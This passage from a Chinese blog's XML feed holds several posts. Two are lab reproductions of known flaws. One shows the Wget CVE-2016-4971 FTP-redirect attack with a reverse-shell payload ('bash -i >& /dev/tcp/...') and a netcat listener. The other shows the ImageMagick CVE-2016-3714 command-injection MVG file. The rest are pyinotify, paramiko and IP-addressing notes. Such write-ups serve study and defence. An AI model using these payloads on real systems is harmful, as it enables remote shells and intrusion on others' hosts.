    </entry>
    
    <entry>
      <title>Wget漏洞（CVE-2016-4971）</title>
      <link href="/2016/06/22/%E6%BC%8F%E6%B4%9E/Wget%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4971%EF%BC%89/"/>
      <url>/2016/06/22/%E6%BC%8F%E6%B4%9E/Wget%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4971%EF%BC%89/</url>
      <content type="html"><![CDATA[<p>参考：<a href="http://www.freebuf.com/vuls/107206.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/107206.html</a></p><p>wget 作为 linux 系统常用下载工具，支持http、https、ftp 等多种协议，当使用wget 下载文件时，若初始下载http服务提供的下载资源， 如果服务器将下载资源重定向到ftp服务时，wget 会默认信赖http服务器重定向的ftp 链接地址和文件名，而不做二次验证。从而可能下载到恶意钓鱼者的恶意文件，导致主机被入侵。</p><h3 id="查看wget版本"><a href="#查看wget版本" class="headerlink" title="查看wget版本"></a>查看wget版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># wget --version</span></span><br><span class="line">GNU Wget 1.12 built on linux-gnu.</span><br></pre></td></tr></table></figure><h3 id="搭建ftp"><a href="#搭建ftp" class="headerlink" title="搭建ftp"></a>搭建ftp</h3><p>在本机 （192.168.100.128）主机上开启ftp服务，且将攻击payload (bash -i &gt;&amp; /dev/tcp/74.207.xxx.xxx/9980 0&gt;&amp;1) 写入ftp服务中的.bash_profile 文件中。</p><h3 id="搭建服务并302跳转"><a href="#搭建服务并302跳转" class="headerlink" title="搭建服务并302跳转"></a>搭建服务并302跳转</h3><p>kali（192.168.3.54）上搭建服务器跳转到ftp服务器 <a href="ftp://192.168.100.128/.bash_profile" target="_blank" rel="noopener">ftp://192.168.100.128/.bash_profile</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/noharm.txt")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"ftp://192.168.100.128/.bash_profile"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure></p><h3 id="用wget下载文件"><a href="#用wget下载文件" class="headerlink" title="用wget下载文件"></a>用wget下载文件</h3><p>下载 192.168.3.54/noharm.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost <span class="built_in">test</span>]<span class="comment"># wget 192.168.3.54/noharm.txt</span></span><br><span class="line">--2016-06-22 09:47:17-- http://192.168.3.54/noharm.txt</span><br><span class="line">Connecting to 192.168.3.54:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 302 FOUND</span><br><span class="line">Location: ftp://192.168.100.128/.bash_profile [following]</span><br><span class="line">--2016-06-22 09:47:17-- ftp://192.168.100.128/.bash_profile</span><br><span class="line"> =&gt; “.bash_profile”</span><br><span class="line">Connecting to 192.168.100.128:21... connected.</span><br><span class="line">Logging <span class="keyword">in</span> as anonymous ... Logged <span class="keyword">in</span>!</span><br><span class="line">==&gt; SYST ... <span class="keyword">done</span>. ==&gt; PWD ... <span class="keyword">done</span>.</span><br><span class="line">==&gt; TYPE I ... <span class="keyword">done</span>. ==&gt; CWD not needed.</span><br><span class="line">==&gt; SIZE .bash_profile ... 23</span><br><span class="line">==&gt; PASV ... <span class="keyword">done</span>. ==&gt; RETR .bash_profile ... <span class="keyword">done</span>.</span><br><span class="line">Length: 23 (unauthoritative)</span><br><span class="line"></span><br><span class="line">100%[========================================================================&gt;] 23 --.-K/s <span class="keyword">in</span> 0s</span><br><span class="line"></span><br><span class="line">2016-06-22 09:47:17 (718 KB/s) - “.bash_profile” saved [23]</span><br></pre></td></tr></table></figure><h3 id="在kali监听9980-端口"><a href="#在kali监听9980-端口" class="headerlink" title="在kali监听9980 端口"></a>在kali监听9980 端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -l -p 9980</span></span><br></pre></td></tr></table></figure><h3 id="重启时会触发-bash-profile文件中的恶意代码执行"><a href="#重启时会触发-bash-profile文件中的恶意代码执行" class="headerlink" title="重启时会触发.bash_profile文件中的恶意代码执行"></a>重启时会触发.bash_profile文件中的恶意代码执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># source .bash_profile</span></span><br></pre></td></tr></table></figure><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>图</p>]]></content>
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> Wget漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pyinotify</title>
      <link href="/2016/05/25/python/pyinotify/"/>
      <url>/2016/05/25/python/pyinotify/</url>
      <content type="html"><![CDATA[<p> Inotify是一个事件驱动的通知机制，Inotify 提供一个简单的API，使用最小的文件描述符，并且允许细粒度监控。与 inotify 的通信是通过系统调用实现。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyEventHandler</span><span class="params">(pyinotify.ProcessEvent)</span>:</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#IN_ACCESS，即文件被访问</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_ACCESS</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> LOG.debug(<span class="string">u"文件被访问:"</span> + event.pathname)</span><br><span class="line"> <span class="comment">#IN_MODIFY，文件被write</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_MODIFY</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> removeStrInFile(event.pathname)</span><br><span class="line"> restoreFile(event.pathname)</span><br><span class="line"> <span class="comment">#IN_ATTRIB，文件属性被修改，如chmod、chown、touch等</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_ATTRIB</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> LOG.debug(<span class="string">u"文件属性被修改:"</span> + event.pathname)</span><br><span class="line"> <span class="comment">#IN_CLOSE_WRITE，可写文件被close</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_CLOSE_WRITE</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> LOG.debug(<span class="string">u"可写文件被关闭:"</span> + event.pathname)</span><br><span class="line"> <span class="comment">#IN_CLOSE_NOWRITE，不可写文件被close</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_CLOSE_NOWRITE</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> LOG.debug(<span class="string">u"不可写文件被关闭:"</span> + event.pathname)</span><br><span class="line"> <span class="comment">#IN_OPEN，文件被open</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_OPEN</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> LOG.debug(<span class="string">u"文件被打开:"</span> + event.pathname)</span><br><span class="line"> <span class="comment">#IN_MOVED_FROM，文件被移走,如mv</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_MOVED_FROM</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> LOG.info(<span class="string">u"文件被移走:"</span> + event.pathname)</span><br><span class="line"> <span class="comment">#IN_MOVED_TO，文件被移来，如mv、cp</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_MOVED_TO</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> LOG.info( <span class="string">u"文件被移来:"</span> + event.pathname)</span><br><span class="line"> <span class="comment">#IN_CREATE，创建新文件</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_CREATE</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> <span class="keyword">if</span> event.pathname <span class="keyword">in</span> filehash:</span><br><span class="line"> LOG.info(<span class="string">u"创建新文件:"</span> + event.pathname)</span><br><span class="line"> restoreFile(event.pathname)</span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line"> removeFileOrDir(event.pathname)</span><br><span class="line"> <span class="comment">#IN_DELETE，文件被删除，如rm</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_DELETiE</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> LOG.info(<span class="string">u"文件被删除:"</span> + event.pathname)</span><br><span class="line"> <span class="comment">#IN_DELETE_SELF，自删除，即一个可执行文件在执行时删除自己</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_DELETE_SELF</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> LOG.info(<span class="string">u"可执行文件删除:"</span> + event.pathname)</span><br><span class="line"> <span class="comment">#IN_MOVE_SELF，自移动，即一个可执行文件在执行时移动自己</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_MOVE_SELF</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> LOG.info(<span class="string">u"可执行文件移动:"</span> + event.pathname)</span><br><span class="line"> <span class="comment">#IN_UNMOUNT，宿主文件系统被umount</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_UNMOUNT</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> LOG.info(<span class="string">u"文件系统被umount:"</span> + event.pathname)</span><br><span class="line"> <span class="comment">#IN_CLOSE，文件被关闭，等同于(IN_CLOSE_WRITE | IN_CLOSE_NOWRITE)</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_CLOSE</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> LOG.debug(<span class="string">u"文件被关闭:"</span> + event.pathname)</span><br><span class="line"> <span class="comment">#IN_MOVE，文件被移动，等同于(IN_MOVED_FROM | IN_MOVED_TO)</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_IN_MOVE</span><span class="params">(self, event)</span>:</span></span><br><span class="line"> LOG.info(<span class="string">u"文件被移动:"</span> + event.pathname)</span><br><span class="line"></span><br><span class="line">wm = pyinotify.WatchManager()</span><br><span class="line">wm.add_watch(watchlist, pyinotify.ALL_EVENTS, rec=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># event handler</span></span><br><span class="line">eh = MyEventHandler()</span><br><span class="line"></span><br><span class="line"><span class="comment"># notifier</span></span><br><span class="line">notifier = pyinotify.Notifier(wm, eh)</span><br><span class="line">notifier.loop()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> python </category>
          
          <category> 模块 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 模块 </tag>
            
            <tag> pyinotify </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>paramiko</title>
      <link href="/2016/05/25/python/paramiko/"/>
      <url>/2016/05/25/python/paramiko/</url>
      <content type="html"><![CDATA[<p>paramiko模块是用python语言写的一个模块，遵循SSH2协议，支持以加密和认证的方式，进行远程服务器的连接</p><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line">ssh = paramiko.SSHClient()</span><br><span class="line">ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">ssh.connect(<span class="string">"某IP地址"</span>,<span class="number">22</span>,<span class="string">"用户名"</span>, <span class="string">"口令"</span>)</span><br><span class="line">stdin, stdout, stderr = ssh.exec_command(<span class="string">"你的命令"</span>)</span><br><span class="line"><span class="keyword">print</span> stdout.readlines()</span><br><span class="line">ssh.close()</span><br></pre></td></tr></table></figure><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line">t = paramiko.Transport((<span class="string">"某IP地址"</span>,<span class="number">22</span>))</span><br><span class="line">t.connect(username = <span class="string">"用户名"</span>, password = <span class="string">"口令"</span>)</span><br><span class="line">sftp = paramiko.SFTPClient.from_transport(t)</span><br><span class="line">remotepath=<span class="string">'/tmp/test.txt'</span></span><br><span class="line">localpath=<span class="string">'/tmp/test.txt'</span></span><br><span class="line">sftp.put(localpath,remotepath)</span><br><span class="line">t.close()</span><br></pre></td></tr></table></figure><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line">t = paramiko.Transport((<span class="string">"某IP地址"</span>,<span class="number">22</span>))</span><br><span class="line">t.connect(username = <span class="string">"用户名"</span>, password = <span class="string">"口令"</span>)</span><br><span class="line">sftp = paramiko.SFTPClient.from_transport(t)</span><br><span class="line">remotepath=<span class="string">'/tmp/test.txt'</span></span><br><span class="line">localpath=<span class="string">'/tmp/test.txt'</span></span><br><span class="line">sftp.get(remotepath, localpath)</span><br><span class="line">t.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> python </category>
          
          <category> 模块 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 模块 </tag>
            
            <tag> paramiko </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>IP地址分类</title>
      <link href="/2016/05/14/post/IP%E5%9C%B0%E5%9D%80%E5%88%86%E7%B1%BB/"/>
      <url>/2016/05/14/post/IP%E5%9C%B0%E5%9D%80%E5%88%86%E7%B1%BB/</url>
      <content type="html"><![CDATA[<p><a href="http://blog.csdn.net/javagtcpp/article/details/9282913" target="_blank" rel="noopener">原文</a></p><p>IP地址分类/IP地址10开头和172开头和192开头的区别/判断是否同一网段<br>简单来说在公司或企业内部看到的就基本都是内网IP，ABC三类IP地址里的常见IP段。<br>每个IP地址都包含两部分，即网络号和主机号。</p><h2 id="InterNIC将IP地址分为五类"><a href="#InterNIC将IP地址分为五类" class="headerlink" title="InterNIC将IP地址分为五类:"></a>InterNIC将IP地址分为五类:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A类保留给ZF或大型企业，</span><br><span class="line">B类分配给中等规模的公司，</span><br><span class="line">C类分配给小公司或个人，</span><br><span class="line">D类用于组播，</span><br><span class="line">E类用于实验，</span><br><span class="line">注：各类可容纳的地址数目不同。</span><br></pre></td></tr></table></figure><h2 id="A、B、C三类IP地址的特征："><a href="#A、B、C三类IP地址的特征：" class="headerlink" title="A、B、C三类IP地址的特征："></a>A、B、C三类IP地址的特征：</h2><p>当将IP地址写成二进制形式时，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">A类地址的第一位总是O，如，10.0.0.1==00001010-00000000-00000000-00000001</span><br><span class="line">==》1.0.0.0-127.255.255.255，默认子网掩码为255.0.0.0，最多可容纳16777215台计算机</span><br><span class="line"></span><br><span class="line">B类地址的前两位总是10，如，172.16.0.1==10101100-00010000-00000000-00000001</span><br><span class="line">==》128.0.0.0-191.255.255.255，默认子网掩码为255.255.0.0，最多可容纳65535台计算机</span><br><span class="line"></span><br><span class="line">C类地址的前三位总是110。如，192.168.0.1==11000000-10101000-00000000-00000001</span><br><span class="line">==》192.0.0.0-223.255.255.255，默认子网掩码是255.255.255.0，最多可容纳254台计算机</span><br><span class="line">IP地址中保留地址：主机部分全为0的IP地址保留用于网络地址，主机部分全为1的IP地址保留为广播地址，224--255部分保留作为组播和实 验目的。</span><br><span class="line"></span><br><span class="line">同时注意IP地址分配时不能使用最末位为0和255的地址，因为这是广播地址，普通计算机上不能使用，但可用于网关和路由器上。</span><br></pre></td></tr></table></figure></p><h2 id="专用IP地址："><a href="#专用IP地址：" class="headerlink" title="专用IP地址："></a>专用IP地址：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">就是我们在3类地址中常见到内网的IP段。</span><br><span class="line">10.0.0.0--10.255.255.255</span><br><span class="line">172.16.0.0--172.31.255.255</span><br><span class="line">192.168.0.0--192.168.255.255</span><br></pre></td></tr></table></figure><p>内网的计算机以NAT（网络地址转换）协议，通过一个公共的网关访问Internet。内网的计算机可向Internet上的其他计算机发送连接请求，但Internet上其他的计算机无法向内网的计算机发送连接请求。<br>主机地址种类</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>　　通过IP地址的引导位(最高位)来区分不同类别的IP地址：<br>　　注：n为网络编号位，h为主机编号位　　</p><h3 id="A类地址"><a href="#A类地址" class="headerlink" title="A类地址"></a>A类地址</h3><p>　　A类地址：0nnnnnnn.hhhhhhhh.hhhhhhhh.hhhhhhhh<br>　　A类地址具有7位网络编号，因此可定义126个A类网络{2^7－2(网络编号不能是全0或全1 注1)-1(127为环回地址 注2)}每个网络可以拥有的主机数为16777214{2^24-2(主机位不能是全0或全1)}<br>　　十进制表示范围：1.0.0.1-126.255.255.254,任何一个0到127间的网络地址均是一个A类地址。</p><h3 id="B类地址"><a href="#B类地址" class="headerlink" title="B类地址"></a>B类地址</h3><p>　　B类地址：10nnnnnn.nnnnnnnn.hhhhhhhh.hhhhhhhh<br>　　B类地址具有14位网络编号，因此可定义16382个B类网络{2^14-2}<br>　　每个网络可以拥有的主机数为65534{2^16-2}<br>　　十进制表示范围：129.0.0.1-191.255.255.254,任何一个128到191间的网络地址是一个B类地址。</p><h3 id="C类地址"><a href="#C类地址" class="headerlink" title="C类地址"></a>C类地址</h3><p>　　C类地址：110nnnnn.nnnnnnnn.nnnnnnnn.hhhhhhhh<br>　　C类地址具有21位网络编号，因此可定义2097152个C类地址{2^21-2}<br>　　每个网络可以拥有的主机数为254{2^8-2}<br>　　十进制表示范围：192.0.0.1-223.255.255.254,任何一个192到223间的网络地址是一个C类地址。</p><h3 id="D类地址"><a href="#D类地址" class="headerlink" title="D类地址"></a>D类地址</h3><p>　　D类地址：1110xxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>　　D类地址用于组播，前面4位1110引导，后面28位为组播地址ID。<br>　　十进制表示范围：224.0.0.0-239.255.255.255</p><h3 id="E类地址"><a href="#E类地址" class="headerlink" title="E类地址"></a>E类地址</h3><p>　　E类地址：总是以1111四位引导<br>　　E类地址用于研究用<br>　　十进制表示范围：240-<br>　　IP地址由InterNIC(因特网信息中心)统一分配，以保证IP地址的唯一性，但有一类IP地址是不用申请可直接用于企业内部网的，这就是 Private Address，Private Address不会被INTERNET上的任何路由器转发，欲接入INTERNET必须要通过NAT/PAT转换，以公有IP的形式接入。<br>　　这些私为地址为：<br>　　10.0.0.0-10.255.255.255（一个A类地址）<br>　　172.16.0.0－172.31.255.255（16个B类地址）<br>　　192.168.0.0－192.168.255.255（256个C类地址）<br>　　任何一个第一个八位组在224到239间的网络地址是一个组播地址<br>　　任何一个专用I P网络均可以使用包括:<br>　　1个A类地址( 10.0.0.0 )、<br>　　16个B类地址(从172.16.0.0到172.31.0.0 )<br>　　256个C类地址(从192.168.0.0到192.168.255.0 )<br>　　<br>CIDR值和掩码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">CIDR值              子网掩码</span><br><span class="line">/8                255.0.0.0</span><br><span class="line">/9                255.128.0.0</span><br><span class="line">/10              255.192.0.0</span><br><span class="line">/11              255.224.0.0</span><br><span class="line">/12              255.240.0.0</span><br><span class="line">/13              255.248.0.0</span><br><span class="line">/14              255.252.0.0</span><br><span class="line">/15              255.254.0.0</span><br><span class="line">/16             255.255.0.0</span><br><span class="line">/17             255.255.128.0</span><br><span class="line">/18             255.255.192.0</span><br><span class="line">/19             255.255.224.0</span><br><span class="line">/20             255.255.240.0</span><br><span class="line">/21             255.255.248.0</span><br><span class="line">/22             255.255.252.0</span><br><span class="line">/23             255.255.254.0</span><br><span class="line">/24             255.255.255.0</span><br><span class="line">/25             255.255.255.128</span><br><span class="line">/26             255.255.255.192</span><br><span class="line">/27             255.255.255.224</span><br><span class="line">/28             255.255.255.240</span><br><span class="line">/29             255.255.255.248</span><br><span class="line">/30             255.255.255.252</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 协议 </category>
          
          <category> http </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 协议 </tag>
            
            <tag> http </tag>
            
            <tag> IP地址分类 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ImageMagick（VE-2016-3714）</title>
      <link href="/2016/05/11/%E6%BC%8F%E6%B4%9E/ImageMagick%EF%BC%88VE-2016-3714%EF%BC%89/"/>
      <url>/2016/05/11/%E6%BC%8F%E6%B4%9E/ImageMagick%EF%BC%88VE-2016-3714%EF%BC%89/</url>
      <content type="html"><![CDATA[<h3 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h3><p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行</p><p>在ImageMagick的默认配置文件里可以看到所有的委托： /etc/ImageMagick/delegates.xml</p><p>有一行直接执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;delegate decode=&quot;https&quot; command=&quot;&amp;quot;curl&amp;quot; -s -k -o &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;&quot;/&gt;</span><br></pre></td></tr></table></figure></p><h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>系统kali-linux-2016.1-amd64<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># apt-get install php-dev</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># apt-get install libmagickwand-dev</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># pecl install imagick</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># apt-get install php-imagick</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># echo "extension=imagick.so" &gt;&gt; /etc/php5/apache2/php.ini</span></span><br></pre></td></tr></table></figure></p><h3 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h3><h4 id="直接操作："><a href="#直接操作：" class="headerlink" title="直接操作："></a>直接操作：</h4><p>我们可以构造一个.mvg格式的图片（但文件名可以不为.mvg）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># vi 1.mvg</span></span><br><span class="line"></span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill <span class="string">'url(https://"|w")'</span></span><br><span class="line">pop graphic-context</span><br><span class="line">root@kali:~/Desktop<span class="comment"># convert 1.mvg 1.png</span></span><br><span class="line"> 08:53:29 up 1:34, 1 user, load average: 0.00, 0.04, 0.12</span><br><span class="line">USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT</span><br><span class="line">root tty2 :0 05:32 3:21m 3:06 0.46s /usr/bin/python</span><br><span class="line">convert: unrecognized color `https://<span class="string">"|w"</span><span class="string">' @ warning/color.c/GetColorCompliance/1046.</span></span><br><span class="line"><span class="string">convert: unable to open image `/tmp/magick-26436IZkdSTzRhkfm'</span>: 没有那个文件或目录 @ error/blob.c/OpenBlob/2709.</span><br><span class="line">convert: unable to open file `/tmp/magick-26436IZkdSTzRhkfm<span class="string">': 没有那个文件或目录 @ error/constitute.c/ReadImage/540.</span></span><br><span class="line"><span class="string">convert: non-conforming drawing primitive definition `fill'</span> @ error/draw.c/DrawImage/3182.</span><br><span class="line">```</span><br><span class="line"><span class="comment">#### php测试：</span></span><br><span class="line">```bash</span><br><span class="line">root@kali:~/Desktop<span class="comment"># vi 1.php</span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">new Imagick(<span class="string">"1.mvg"</span>)</span><br><span class="line">?&gt;</span><br><span class="line">运行</span><br><span class="line">root@kali:~/Desktop<span class="comment"># php 1.php</span></span><br><span class="line"> 08:57:43 up 1:38, 1 user, load average: 0.00, 0.02, 0.09</span><br><span class="line">USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT</span><br><span class="line">root tty2 :0 05:32 3:25m 3:14 0.46s /usr/bin/python</span><br><span class="line">php7.0: unrecognized color `https://<span class="string">"|w"</span><span class="string">' @ warning/color.c/GetColorCompliance/1046.</span></span><br><span 